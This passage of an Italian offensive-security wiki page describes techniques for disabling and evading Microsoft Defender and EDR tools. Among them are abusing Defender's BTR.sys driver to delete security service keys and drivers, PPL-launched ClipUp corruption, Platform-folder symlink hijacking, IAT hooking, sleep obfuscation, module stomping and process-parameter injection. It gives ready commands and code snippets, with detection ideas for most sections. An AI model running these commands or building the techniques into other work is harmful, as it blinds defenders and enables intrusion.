| 1 | `[UTF-16 path]` | Elimina un file, anche se bloccato |
| 2 | `[UTF-16 path]` | Rimuove una directory vuota |
| 3 | `[Flags][source][destination]` | Sposta un file in un percorso protetto scelto dall’attaccante; una destinazione vuota comporta l’eliminazione |
| 4 | `[Flags][key path]` | Elimina ricorsivamente una chiave del registro |
| 5 | `[Flags][key path + "\\" + value]` | Elimina un valore del registro |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Crea/aggiorna un valore del registro e crea i percorsi mancanti delle chiavi |

Per le azioni 5 e 6, il separatore chiave/valore sul wire è composto da **due backslash consecutivi**; un percorso formattato secondo la convenzione non verrà suddiviso correttamente. Il file di feedback rispecchia perlopiù la richiesta, ma i primi quattro byte di dati di ogni elemento diventano il relativo `NTSTATUS`. Per le azioni 1 e 2, che non hanno un campo flags iniziale, BTR sposta il percorso nei quattro byte finali riservati per fare spazio a questo status.<sup>[[36]](#references)</sup>

### Workflow di `BTR_CLI` e finestra di avvio anticipato

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementa l’intera catena: estrae `BTR.sys` da Defender locale, crea `<random>.sys:changelist` e un flusso di feedback, serializza/verifica i checksum/cifra azioni concatenate, crea direttamente la chiave del registro del servizio, quindi chiama `NtLoadDriver` per `-trigger now` oppure lo lascia come driver a avvio del sistema per `-trigger boot`. La configurazione diretta del registro evita il normale percorso SCM `CreateServiceW` e quindi **non** genera l’evento di installazione del servizio ID 7045. Gli artefatti attivati all’avvio possono essere rimossi in seguito con `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` non è utilizzabile perché BTR esegue operazioni di I/O sui file da `DriverEntry`, prima che lo stack di archiviazione e il collegamento `SystemRoot` siano pronti. `Start=1` insieme al gruppo ad alta priorità `Boot Bus Extender` consente invece l’esecuzione nella Fase 1: NTFS è utilizzabile, ma molti driver di sicurezza con avvio di sistema e servizi EDR in modalità utente non sono ancora stati inizializzati. I filtri con avvio in fase di boot come `WdFilter` potrebbero essere già caricati, ma BTR può rimuoverne i file binari o la configurazione del servizio prima dell’avvio successivo e può eliminare gli eseguibili dei servizi prima che SCM li avvii. ELAM non colma questa lacuna perché BTR viene eseguito dopo la valutazione dei driver di avvio e dispone di una firma Microsoft valida.<sup>[[36]](#references)</sup>

Più azioni vengono eseguite in un'unica transazione. Il PoC antepone l’Azione 1 per il percorso hard-coded `\SystemRoot\Temp\BootClean.log`: BTR crea questo log, quindi esegue la propria richiesta di eliminazione e lo rimuove prima di scaricarsi. Questo riduce le evidenze, mentre salvare il feedback in `<random>.sys:<random>.dat` consente di rimuovere insieme il driver e i due stream.<sup>[[36]](#references)[[37]](#references)</sup>

### Correlazioni di rilevamento ad alto segnale

Le regole basate solo sulla firma e l’elenco di blocco dei driver vulnerabili di Microsoft non contrastano l’abuso delle funzionalità previste di BTR. Preferisci queste correlazioni comportamentali, distinguendo al contempo la legittima provenienza da Defender da un launcher qualsiasi.<sup>[[36]](#references)</sup>

- **Sysmon 15:** la creazione di `.sys:changelist` è universale nella fase di staging di BTR. Un ADS `.dat` associato allo stesso `.sys` è particolarmente sospetto, perché Defender in genere salva il feedback in `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 senza System 7045:** correla la creazione diretta di `HKLM\SYSTEM\CurrentControlSet\Services\<random>` contenente `Args=...:changelist` e `Group=Boot Bus Extender` con l’assenza di un evento di installazione SCM corrispondente.
- **Sysmon 6 -> 23:** correla il caricamento di un driver BTR noto da una provenienza diversa da Defender con la successiva eliminazione di file attribuita a `System`/PID 4, in particolare se si tratta di file binari di sicurezza.
- **Sysmon 11 -> 23:** genera un avviso in caso di creazione ed eliminazione rapida di `\SystemRoot\Temp\BootClean.log` da parte di `System`/PID 4.
- Limita e verifica l’assegnazione/l’abilitazione di `SeLoadDriverPrivilege`; una firma Microsoft da sola non è sufficiente per considerare attendibile un driver di uno strumento di sicurezza messo in staging da `cmd.exe`, PowerShell o un processo sconosciuto.

## Abusare di Protected Process Light (PPL) per manomettere AV/EDR con LOLBINs

Protected Process Light (PPL) applica una gerarchia di firmatari/livelli, in modo che solo i processi protetti con livello uguale o superiore possano manomettersi a vicenda. Dal punto di vista offensivo, se riesci ad avviare legittimamente un binario abilitato per PPL e a controllarne gli argomenti, puoi trasformare funzionalità innocue (ad es. la registrazione nei log) in una primitiva di scrittura limitata, supportata da PPL, contro le directory protette utilizzate da AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Cosa serve perché un processo venga eseguito come PPL
- Il file EXE di destinazione (e qualsiasi DLL caricata) deve essere firmato con un EKU compatibile con PPL.
- Il processo deve essere creato con CreateProcess usando i flag: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- È necessario richiedere un livello di protezione compatibile con il firmatario del binario (ad es. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` per i firmatari antimalware, `PROTECTION_LEVEL_WINDOWS` per i firmatari Windows). Livelli errati impediranno la creazione.

Vedi anche un’introduzione più ampia a PP/PPL e alla protezione di LSASS qui:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Strumenti di launcher
- Strumento helper open source: CreateProcessAsPPL (seleziona il livello di protezione e inoltra gli argomenti al file EXE di destinazione):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Modalità d’uso:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

Primitiva LOLBIN: ClipUp.exe
- Il binario di sistema firmato `C:\Windows\System32\ClipUp.exe` genera autonomamente un processo figlio e accetta un parametro per scrivere un file di log in un percorso specificato dal chiamante.
- Quando viene avviato come processo PPL, la scrittura del file avviene con il supporto di PPL.
- ClipUp non riesce a interpretare i percorsi contenenti spazi; usa i percorsi brevi 8.3 per puntare a posizioni normalmente protette.

Helper per i percorsi brevi 8.3
- Elencare i nomi brevi: `dir /x` in ogni directory padre.
- Ricavare il percorso breve in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Catena di abuso (astratta)
1) Avviare il LOLBIN in grado di usare PPL (ClipUp) con `CREATE_PROTECTED_PROCESS` tramite un launcher (ad es., CreateProcessAsPPL).
2) Passare l'argomento per il percorso del log di ClipUp, in modo da forzare la creazione di un file in una directory AV protetta (ad es., Defender Platform). Se necessario, usare i nomi brevi 8.3.
3) Se il binario di destinazione è normalmente aperto/bloccato dall'AV durante l'esecuzione (ad es., MsMpEng.exe), programmare la scrittura all'avvio, prima che parta l'AV, installando un servizio ad avvio automatico che venga eseguito in modo affidabile in precedenza. Verificare l'ordine di avvio con Process Monitor (boot logging).
4) Al riavvio, la scrittura supportata da PPL avviene prima che l'AV blocchi i propri binari, corrompendo il file di destinazione e impedendone l'avvio.

Esempio di invocazione (percorsi oscurati/abbreviati per sicurezza):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Note e vincoli
- Non puoi controllare il contenuto scritto da ClipUp, ma solo la posizione; questa primitiva è adatta alla corruzione, non all'iniezione precisa di contenuti.
- Sono necessari privilegi di amministratore locale/SYSTEM per installare/avviare un servizio e una finestra di riavvio.
- Il tempismo è fondamentale: il target non deve essere aperto; l'esecuzione all'avvio evita i blocchi dei file.

Rilevamenti
- Creazione del processo `ClipUp.exe` con argomenti insoliti, soprattutto se avviato da launcher non standard, in prossimità dell'avvio.
- Nuovi servizi configurati per avviare automaticamente binari sospetti e che si avviano sistematicamente prima di Defender/AV. Esamina la creazione/modifica dei servizi antecedente agli errori di avvio di Defender.
- Monitoraggio dell'integrità dei file dei binari/delle directory Platform di Defender; creazioni/modifiche impreviste da parte di processi con flag di processo protetto.
- Telemetria ETW/EDR: cerca processi creati con `CREATE_PROTECTED_PROCESS` e un uso anomalo del livello PPL da parte di binari non-AV.

Mitigazioni
- WDAC/Code Integrity: limita quali binari firmati possono essere eseguiti come PPL e da quali processi padre; blocca l'esecuzione di ClipUp al di fuori dei contesti legittimi.
- Gestione dei servizi: limita la creazione/modifica dei servizi ad avvio automatico e monitora la manipolazione dell'ordine di avvio.
- Assicurati che la protezione antimanomissione di Defender e le protezioni di avvio anticipato siano abilitate; esamina gli errori di avvio che indicano una corruzione dei binari.
- Valuta la possibilità di disabilitare la generazione di nomi brevi 8.3 nei volumi che ospitano strumenti di sicurezza, se compatibile con il tuo ambiente (esegui test approfonditi).

## Manomissione di Microsoft Defender tramite dirottamento di un collegamento simbolico nella cartella Platform

Windows Defender sceglie la piattaforma da cui viene eseguito enumerando le sottocartelle in:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Seleziona la sottocartella con la stringa di versione lessicograficamente più alta (ad esempio, `4.18.25070.5-0`), quindi avvia da lì i processi del servizio Defender (aggiornando di conseguenza i percorsi del servizio/registro). Questa selezione si basa sulle voci delle directory, inclusi i punti di analisi delle directory (collegamenti simbolici). Un amministratore può sfruttare questa situazione per reindirizzare Defender a un percorso scrivibile da un attaccante e ottenere un DLL sideloading o interrompere il servizio.<sup>[[21]](#references)[[22]](#references)</sup>

Prerequisiti
- Amministratore locale (necessario per creare directory/collegamenti simbolici nella cartella Platform)
- Possibilità di riavviare o attivare una nuova selezione della piattaforma Defender (riavvio del servizio all'avvio)
- Sono sufficienti gli strumenti integrati (mklink)

Perché funziona
- Defender blocca le scritture nelle proprie cartelle, ma la selezione della piattaforma si basa sulle voci delle directory e sceglie la versione lessicograficamente più alta senza verificare che la destinazione punti a un percorso protetto/affidabile.

Procedura dettagliata (esempio)
1) Prepara una copia scrivibile della cartella della piattaforma corrente, ad esempio `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crea all'interno di Platform un symlink di directory con una versione più alta che punti alla tua cartella:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Selezione del trigger (riavvio consigliato):
```cmd
shutdown /r /t 0
```
4) Verifica che MsMpEng.exe (WinDefend) venga eseguito dal percorso reindirizzato:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Dovresti osservare il nuovo percorso del processo in `C:\TMP\AV\` e la configurazione del servizio/il registro che riflettono tale percorso.

Opzioni post-exploitation
- DLL sideloading/code execution: rilascia/sostituisci DLL che Defender carica dalla propria directory applicativa per eseguire codice nei processi di Defender. Vedi la sezione precedente: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Arresto/negazione del servizio: rimuovi il symlink della versione, così al successivo avvio il percorso configurato non verrà risolto e Defender non riuscirà ad avviarsi:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Nota: questa tecnica non consente di per sé l'escalation dei privilegi; richiede diritti di amministratore.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

I red team possono spostare l'evasione runtime dall'impianto C2 al modulo bersaglio stesso, agganciando la sua Import Address Table (IAT) e instradando API selezionate attraverso codice position-independent (PIC) controllato dall'attaccante. Questo generalizza l'evasione oltre la ridotta superficie di API esposta da molti kit (ad es., CreateProcessA) ed estende le stesse protezioni ai BOF e alle DLL di post-exploitation.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Approccio di alto livello
- Caricare uno stage PIC insieme al modulo bersaglio usando un reflective loader (anteposto o come modulo di supporto). Il PIC deve essere autonomo e position-independent.
- Durante il caricamento della DLL host, scorrere il suo IMAGE_IMPORT_DESCRIPTOR e modificare le voci IAT delle importazioni selezionate (ad es., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) affinché puntino a wrapper PIC essenziali.
- Ogni wrapper PIC esegue le tecniche di evasione prima di chiamare l'indirizzo dell'API reale. Le tecniche di evasione tipiche includono:
  - Mascherare/ripristinare la memoria prima e dopo la chiamata (ad es., cifrare le regioni del beacon, RWX→RX, modificare i nomi/le autorizzazioni delle pagine).
  - Call-stack spoofing: creare uno stack benigno e passare all'API bersaglio in modo che l'analisi del call stack rilevi i frame previsti.<sup>[[9]](#references)</sup>
- Per garantire la compatibilità, esportare un'interfaccia che consenta a uno script Aggressor (o equivalente) di registrare le API da agganciare per Beacon, BOF e DLL di post-ex.

Perché usare IAT hooking in questo caso
- Funziona con qualsiasi codice che utilizzi l'importazione agganciata, senza modificare il codice dello strumento né affidarsi a Beacon per inoltrare API specifiche.
- Copre le DLL di post-ex: agganciare LoadLibrary* consente di intercettare il caricamento dei moduli (ad es., System.Management.Automation.dll, clr.dll) e applicare le stesse tecniche di mascheramento/evasione dello stack alle loro chiamate API.
- Ripristina l'uso affidabile dei comandi di post-ex che creano processi contro i rilevamenti basati sul call stack, tramite wrapper per CreateProcessA/W.

Schema minimo di hook IAT (pseudocodice C/C++ x64)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Note
- Applica la patch dopo le relocations/ASLR e prima del primo uso dell’import. Loader reflective come TitanLdr/AceLdr dimostrano l’hooking durante il DllMain del modulo caricato.
- Mantieni i wrapper ridotti al minimo e sicuri per PIC; risolvi l’API reale tramite il valore IAT originale acquisito prima della patch oppure tramite LdrGetProcedureAddress.
- Per PIC, usa transizioni RW → RX ed evita pagine lasciate in modalità writable+executable.

Stub di spoofing del call stack
- Gli stub PIC in stile Draugr costruiscono una catena di chiamate falsa (con indirizzi di ritorno in moduli benigni) e poi passano all’API reale.
- Questo aggira i sistemi di rilevamento che si aspettano stack canonici da Beacon/BOF per le API sensibili.
- Abbina queste tecniche al taglio e alla cucitura dello stack per arrivare nei frame previsti prima del prologo dell’API.

Integrazione operativa
- Anteponi il loader reflective alle DLL post-ex, così che PIC e hook si inizializzino automaticamente al caricamento della DLL.
- Usa uno script Aggressor per registrare le API target, in modo che Beacon e BOF usufruiscano in modo trasparente dello stesso percorso di evasione, senza modifiche al codice.

Considerazioni su rilevamento/DFIR
- Integrità IAT: voci che puntano a indirizzi non-image (heap/anonimi); verifica periodica dei puntatori agli import.
- Anomalie dello stack: indirizzi di ritorno non appartenenti a immagini caricate; transizioni improvvise verso PIC non-image; discendenza RtlUserThreadStart incoerente.
- Telemetria del loader: scritture in-process nell’IAT, attività precoce di DllMain che modifica gli import thunk, regioni RX inattese create al caricamento.
- Evasione del caricamento delle immagini: se si intercetta LoadLibrary*, monitorare i caricamenti sospetti di assembly automation/clr correlati a eventi di mascheramento della memoria.

Componenti ed esempi correlati
- Loader reflective che eseguono il patching dell’IAT durante il caricamento (ad es., TitanLdr, AceLdr)
- Hook per il mascheramento della memoria (ad es., simplehook) e PIC per il taglio dello stack (stackcutting)
- Stub PIC per lo spoofing del call stack (ad es., Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Hook IAT all’import time tramite un PICO residente

Se controlli un loader reflective, puoi intercettare gli import **durante** `ProcessImports()` sostituendo il puntatore `GetProcAddress` del loader con un resolver personalizzato che controlla prima gli hook:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Crea un **PICO residente** (oggetto PIC persistente) che sopravviva alla liberazione del PIC temporaneo del loader.
- Esporta una funzione `setup_hooks()` che sovrascriva il resolver degli import del loader (ad es., `funcs.GetProcAddress = _GetProcAddress`).
- In `_GetProcAddress`, ignora gli import ordinali e usa una ricerca degli hook basata su hash, come `__resolve_hook(ror13hash(name))`. Se esiste un hook, restituiscilo; altrimenti delega al `GetProcAddress` reale.
- Registra i target degli hook al momento del linking con le voci Crystal Palace `addhook "MODULE$Func" "hook"`. L’hook resta valido perché risiede nel PICO residente.

Questo consente la **redirezione IAT all’import time** senza patchare la sezione di codice della DLL caricata dopo il load.

### Forzare import intercettabili quando il target usa il PEB-walking

Gli hook all’import time si attivano solo se la funzione è effettivamente nell’IAT del target. Se un modulo risolve le API tramite PEB-walk + hash (senza voce di import), forza un import reale affinché il percorso `ProcessImports()` del loader lo intercetti:

- Sostituisci la risoluzione degli export tramite hash (ad es., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) con un riferimento diretto come `&WaitForSingleObject`.
- Il compilatore genera una voce IAT, consentendo l’intercettazione quando il loader reflective risolve gli import.

### Offuscamento del sonno/idle in stile Ekko senza patchare `Sleep()`

Invece di patchare `Sleep`, intercetta le **primitive effettive di attesa/IPC** usate dall’impianto (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Per attese prolungate, avvolgi la chiamata in una catena di offuscamento in stile Ekko che cifra l’immagine in memoria durante l’inattività:<sup>[[31]](#references)[[27]](#references)</sup>

- Usa `CreateTimerQueueTimer` per pianificare una sequenza di callback che chiamano `NtContinue` con frame `CONTEXT` appositamente costruiti.
- Catena tipica (x64): imposta l’immagine su `PAGE_READWRITE` → cifrala con RC4 tramite `advapi32!SystemFunction032` sull’intera immagine mappata → esegui l’attesa bloccante → decifrala con RC4 → **ripristina i permessi per sezione** scorrendo le sezioni PE → segnala il completamento.
- `RtlCaptureContext` fornisce un modello `CONTEXT`; clonalo in più frame e imposta i registri (`Rip/Rcx/Rdx/R8/R9`) per invocare ogni passaggio.

Dettaglio operativo: restituisci “success” per le attese prolungate (ad es., `WAIT_OBJECT_0`), così il chiamante prosegue mentre l’immagine è mascherata. Questo schema nasconde il modulo agli scanner durante le finestre di inattività ed evita la classica firma “`Sleep()` patchato”.

Idee di rilevamento (basate sulla telemetria)
- Raffiche di callback `CreateTimerQueueTimer` che puntano a `NtContinue`.
- Uso di `advapi32!SystemFunction032` su buffer contigui di grandi dimensioni, pari a un’immagine.
- `VirtualProtect` su intervalli ampi, seguito dal ripristino personalizzato dei permessi per sezione.

### Registrazione CFG a runtime per i gadget di sleep-obfuscation

Nei target con CFG abilitato, il primo salto indiretto verso un gadget a metà funzione, come `jmp [rbx]` o `jmp rdi`, di norma causa il crash del processo con `STATUS_STACK_BUFFER_OVERRUN`, perché il gadget non è presente nei metadati CFG del modulo. Per mantenere attive le catene in stile Ekko/Kraken nei processi hardenizzati:<sup>[[30]](#references)</sup>

- Registra ogni destinazione indiretta usata dalla catena con `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` e voci `CFG_CALL_TARGET_VALID`.
- Per gli indirizzi all’interno di immagini caricate (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` deve partire dalla **base dell’immagine** e coprire **l’intera dimensione dell’immagine**.
- Per regioni mappate manualmente/PIC/stomped, usa invece la **base dell’allocazione** e la relativa dimensione.
- Contrassegna non solo il gadget di dispatch, ma anche gli export raggiunti indirettamente (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, chiamate di sistema wait/event) e tutte le sezioni eseguibili controllate dall’attaccante che diventeranno target indiretti.

Così le catene sleep in stile ROP/JOP passano da “funziona solo nei processi senza CFG” a primitive riutilizzabili per `explorer.exe`, browser, `svchost.exe` e altri endpoint compilati con `/guard:cf`.

### Spoofing dello stack compatibile con CET per i thread in sleep

La sostituzione completa di `CONTEXT` è rumorosa e può causare problemi sui sistemi CET Shadow Stack, perché un `Rip` falsificato deve comunque corrispondere all’hardware shadow stack. Uno schema più sicuro per mascherare il sonno è:<sup>[[30]](#references)</sup>

- Scegli un altro thread nello stesso processo e leggi i limiti dello stack `NT_TIB` / TEB (`StackBase`, `StackLimit`) tramite `NtQueryInformationThread`.
- Esegui il backup del TEB/TIB reale del thread corrente.
- Acquisisci il contesto reale del thread in sleep con `GetThreadContext`.
- Copia **solo** il `Rip` reale nel contesto spoofato, lasciando invariato lo stato spoofato di `Rsp`/stack.
- Durante la finestra di sleep, copia l’`NT_TIB` del thread spoofato nel TEB corrente, così che gli stack walker risalgano all’interno di un intervallo di stack legittimo.
- Al termine dell’attesa, ripristina il TIB originale e il contesto del thread.

Questo mantiene un instruction pointer coerente con CET e inganna gli stack walker EDR che si affidano ai metadati dello stack TEB per convalidare l’unwinding.

### Alternativa basata su APC: Kraken Mask

Se il dispatch tramite timer queue è troppo riconoscibile, la stessa sequenza di sleep-encrypt-spoof-restore può essere eseguita da un thread helper sospeso usando APC accodate:<sup>[[27]](#references)</sup>

- Crea un thread helper con `NtTestAlert` come entrypoint.
- Accoda i frame `CONTEXT`/APC preparati con `NtQueueApcThread` e avviali con `NtAlertResumeThread`.
- Memorizza lo stato della catena nell’heap invece che nello stack dell’helper, per evitare di esaurire lo stack predefinito del thread da 64 KB.
- Usa `NtSignalAndWaitForSingleObject` per segnalare atomicamente l’evento di avvio e bloccare l’esecuzione.
- Sospendi il thread principale prima di ripristinare TIB/contesto (`NtSuspendThread` → restore → `NtResumeThread`) per ridurre la finestra di race in cui uno scanner potrebbe rilevare uno stack ripristinato solo parzialmente.

Questo sostituisce la firma `CreateTimerQueueTimer` + `NtContinue` con una firma thread helper/APC, mantenendo gli stessi obiettivi di mascheramento RC4 e spoofing dello stack.

Altre idee di rilevamento
- `NtSetInformationVirtualMemory` con `VmCfgCallTargetInformation` poco prima di sleep, attese o dispatch APC.
- `GetThreadContext`/`SetThreadContext` usati insieme a `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` o `ConnectNamedPipe`.
- `NtQueryInformationThread` seguito da scritture dirette nei limiti dello stack TEB/TIB del thread corrente.
- Catene `NtQueueApcThread`/`NtAlertResumeThread` che raggiungono indirettamente `SystemFunction032`, `VirtualProtect` o helper per il ripristino dei permessi delle sezioni.
- Uso ripetuto di firme di gadget brevi come `FF 23` (`jmp [rbx]`) o `FF E7` (`jmp rdi`) come pivot di dispatch all’interno di moduli firmati.


## Precision Module Stomping

Il module stomping esegue payload dalla **sezione `.text` di una DLL già mappata nel processo target**, invece di allocare memoria eseguibile privata facilmente rilevabile o caricare una nuova DLL sacrificale. Il target da sovrascrivere dovrebbe essere un’**immagine caricata e supportata da file su disco**, la cui area di codice possa contenere il payload senza corrompere percorsi di codice ancora necessari al processo.<sup>[[1]](#references)[[2]](#references)</sup>

### Selezione affidabile del target

Il module stomping ingenuo su moduli comuni come `uxtheme.dll` o `comctl32.dll` è fragile: la DLL potrebbe non essere caricata nel processo remoto e una regione di codice troppo piccola potrebbe causare il crash del processo. Un flusso di lavoro più affidabile è:

1. Enumera i moduli del processo target e conserva un **elenco di inclusione contenente solo i nomi** delle DLL già caricate.
2. Compila prima il payload e annotane la **dimensione esatta in byte**.
3. Esamina le DLL candidate su disco e confronta **`.text` `Misc_VirtualSize`** della sezione PE con la dimensione del payload. Questo dato è più importante della dimensione del file perché riflette la dimensione della sezione eseguibile **quando viene mappata in memoria**.
4. Analizza la **Export Address Table (EAT)** e scegli l’RVA di una funzione esportata come offset iniziale per lo stomp.
5. Calcola il **raggio d’impatto**: se il payload supera il limite della funzione selezionata, sovrascriverà gli export adiacenti disposti dopo di essa in memoria.

Helper di ricognizione/selezione tipici osservati in natura:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Note operative
- Preferisci DLL **già caricate** nel processo remoto, per evitare la telemetria di `LoadLibrary`/caricamenti imprevisti di immagini.
- Preferisci export eseguiti raramente dall'applicazione target, altrimenti i normali percorsi del codice potrebbero raggiungere i byte sovrascritti prima o dopo la creazione del thread.
- Gli implant di grandi dimensioni spesso richiedono di sostituire l'inserimento dello shellcode come string literal con un **byte-array/braced initializer**, così che l'intero buffer sia rappresentato correttamente nel codice sorgente dell'injector.

Idee di rilevamento
- Scritture remote in pagine eseguibili supportate da immagini (`MEM_IMAGE`, `PAGE_EXECUTE*`), invece che nelle più comuni allocazioni private RWX/RX.
- Entry point degli export i cui byte in memoria non corrispondono più al file di supporto su disco.
- Thread remoti o pivot del contesto che iniziano l'esecuzione all'interno di un export di una DLL legittima i cui primi byte sono stati modificati di recente.
- Sequenze sospette di `VirtualProtect(Ex)` / `WriteProcessMemory` dirette a pagine `.text` di DLL, seguite dalla creazione di un thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) è una tecnica di **process-injection / EDR-evasion** che evita il classico percorso di scrittura remota (`VirtualAllocEx` + `WriteProcessMemory`). Invece di copiare byte in un target già in esecuzione, sfrutta il fatto che Windows **copia determinati parametri di avvio di `CreateProcessW` nel processo figlio** e li memorizza in `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Contenitori avvelenabili copiati da `CreateProcessW`

I contenitori utili sono:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (con `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Vincoli pratici dei contenitori:

- `lpCommandLine` deve puntare a **memoria scrivibile** per `CreateProcessW` ed è limitato a **32.767 caratteri Unicode**, incluso il terminatore null.
- `lpEnvironment` deve essere un blocco di ambiente Unicode composto da stringhe `NAME=VALUE\0` consecutive e terminato da un ulteriore `\0`.
- `lpReserved` è ufficialmente riservato, quindi la corrispondenza con `ShellInfo` va considerata un dettaglio di implementazione, non un contratto documentato stabile.

In questo modo, la normale creazione di un processo diventa la **primitiva di trasferimento del payload**. L'operatore crea il processo figlio con dati di avvio controllati dall'attaccante e lascia che sia Windows a eseguire la copia tra processi.

### Flusso di ricerca remota senza API di scrittura remota

Dopo la creazione del processo figlio, individua il buffer copiato con primitive **di sola lettura**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → ottieni `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Leggi il `PEB` remoto
3. Segui `PEB.ProcessParameters`
4. Leggi `RTL_USER_PROCESS_PARAMETERS`
5. Usa il puntatore selezionato:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Flusso minimo:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Esecuzione del buffer di parametri copiato

La regione dei parametri copiata è in genere `RW`, non eseguibile. Una catena P3 comune è:

1. Creare normalmente il processo (non sospeso)
2. Rendere eseguibile la pagina dei parametri scelta con `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Riutilizzare l'handle del thread principale già restituito in `PROCESS_INFORMATION`
4. Reindirizzare l'esecuzione con `NtSetContextThread` (`CONTEXT_CONTROL`, sovrascrivere `RIP`)

A differenza dei classici flussi di lavoro di thread hijacking, questo **non richiede** `SuspendThread` / `ResumeThread`; il contesto può essere modificato direttamente sull'handle del thread principale restituito.

Questo evita diverse API comunemente monitorate per l'injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- spesso anche `SuspendThread` / `ResumeThread`

### Limite dei byte nulli e shellcode a fasi

Tutti e tre i vettori sono **dati stringa o simili a stringhe**, quindi un payload grezzo che contiene `0x00` viene troncato durante il trasferimento. Una soluzione pratica è un **primo stadio privo di byte nulli** che ricostruisce le costanti a runtime e poi carica un secondo stadio arbitrario.

Un semplice schema consiste nella sintesi di costanti basata su XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Questo consente al first stage di creare stringhe sullo stack, argomenti API, percorsi DLL o un loader shellcode di secondo stage senza incorporare byte nulli nel parametro trasportato.

### Chiamate API basate sullo stack dal first stage

Quando il first stage deve chiamare API come `LoadLibraryA`, può:

- inserire la stringa/il buffer nello stack del target
- riservare i **32 byte di shadow space x64**
- impostare `RCX`, `RDX`, `R8`, `R9` con costanti o puntatori relativi a `RSP`
- mantenere `RSP` **allineato a 16 byte** prima della chiamata

Un second stage può quindi essere copiato dallo stack in un'allocazione `PAGE_READWRITE`, impostato su `PAGE_EXECUTE_READ` con `VirtualProtect` e raggiunto con un salto, evitando un'allocazione RWX diretta.

